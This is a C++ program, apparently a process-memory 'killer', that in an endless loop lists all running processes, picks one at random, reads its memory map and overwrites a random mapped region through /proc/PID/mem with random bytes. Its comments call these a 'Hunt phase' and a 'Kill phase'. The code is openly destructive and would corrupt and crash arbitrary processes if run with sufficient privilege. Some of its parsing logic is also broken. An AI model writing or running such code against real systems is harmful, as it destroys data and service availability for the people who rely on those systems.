#include <iostream>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <vector>
#include <sstream>
#include <tuple>
#include <string>
#include <map>
#include <stdio.h>
#include <stdlib.h>
// #include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include  <random>
#include  <iterator>

template<typename Iter, typename RandomGenerator>
Iter select_randomly(Iter start, Iter end, RandomGenerator& g) {
    //https://stackoverflow.com/questions/6942273/how-to-get-a-random-element-from-a-c-container
    std::uniform_int_distribution<> dis(0, std::distance(start, end) - 1);
    std::advance(start, dis(g));
    return start;
}

template<typename Iter>
Iter select_randomly(Iter start, Iter end) {
    //https://stackoverflow.com/questions/6942273/how-to-get-a-random-element-from-a-c-container
    static std::random_device rd;
    static std::mt19937 gen(rd());
    return select_randomly(start, end, gen);
}

std::string exec(const char* cmd) {
    //https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::vector<size_t> get_pids(){
    std::string pid_string = exec("ps -axo pid"); //-axo for all
    std::vector<size_t> pids;
    size_t pos = 0;
    while (pids.size() < pid_string.length()){
        try {
            pids.push_back(stoi(pid_string.substr(pos, pid_string.find('\n'))));
        }
        catch (std::invalid_argument &i){
            std::cout << i.what() << std::endl;
        }
        catch (std::out_of_range &i){
            break;
        }
        pos+=6;
    }
    return pids;
}

std::map<int, std::vector<std::pair<std::string, std::string>>> get_memory_mapping(std::vector<size_t>& pids){
    std::map<int, std::vector<std::pair<std::string, std::string>>> map;
    for(auto& pid : pids){
        char cmd_buffer[50];
        sprintf(cmd_buffer, "cat /proc/%zu/maps", pid);
        std::string line;
        std::istringstream stream (exec(cmd_buffer));
        while (std::getline(stream, line)) {
            std::string start_addr = line.substr(0, ' ').substr(0, 12);
            std::string end_addr = line.substr(0, ' ').substr(13, 12);
            map[pid].push_back(std::make_pair(start_addr,end_addr));
        }
    }
    return map;
}

std::string make_payload(const unsigned long len) {
    //https://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
    std::string tmp_s;
    static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
    srand( (unsigned) time(NULL) * getpid());
    for (int i = 0; i < len; ++i)
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    return tmp_s;
}

int main() {
    while(true){
        // 1. Hunt phase (select target process and adress range)
        // 1.1 Observe targets (get PIDs + memory mapping)
        std::vector<size_t> pids = get_pids();
        std::map<int, std::vector<std::pair<std::string, std::string>>> memory_map = get_memory_mapping(pids);
        int pid  = *select_randomly(pids.begin(), pids.end());

        // 1.2 Select target from observed targets (ensure we have valid memory mapping)
        while (memory_map.end() == memory_map.find(pid)){
            pid  = *select_randomly(pids.begin(), pids.end());
        }

        // 1.2.1 Select attack surface of selected target (which memory range we attack)
        auto addr_rng = *select_randomly(memory_map[pid].begin(), (memory_map[pid].end()));
        std::string start_addr = addr_rng.first;
        std::string end_addr  = addr_rng.second;

        unsigned long start_value = std::strtoul(addr_rng.first.c_str(), NULL, 16);
        unsigned long end_value = std::strtoul(addr_rng.second.c_str(), NULL, 16);
        unsigned long len = end_value - start_value;

        // 2. Kill phase
        std::string payload = make_payload(len);

        //https://renenyffenegger.ch/notes/Linux/memory/read-write-another-processes-memory
        // 2.1 Acquire target
        char* proc_mem = static_cast<char *>(malloc(len));
        sprintf(proc_mem, "/proc/%d/mem", pid);
        printf("Opening %s, address is %ld\n", proc_mem, start_value);
        int fd_proc_mem = open(proc_mem, O_RDWR);
        if (fd_proc_mem == -1) {
            printf("Could not open %s\n", proc_mem);
            exit(1);
        }
        char* buf = static_cast<char *>(malloc(len));
        lseek(fd_proc_mem, start_value, SEEK_SET);
        read (fd_proc_mem, buf , len);
        printf("String at %ld in process %d is:\n", start_value, pid);
        printf("  %s\n", buf);

        // 2.2 Attack target
        if(buf != nullptr){
            printf("\nNow, this string is modified\n");
            strncpy(buf, payload.c_str(), len);
            lseek(fd_proc_mem, start_value, SEEK_SET);
            if (write (fd_proc_mem, buf , len     ) == -1) {
                printf("Error while writing\n");
                exit(1);
            }
        };

        // 2.3 Clean up
        free(buf);
        free(proc_mem);
    }
    return 0;
}
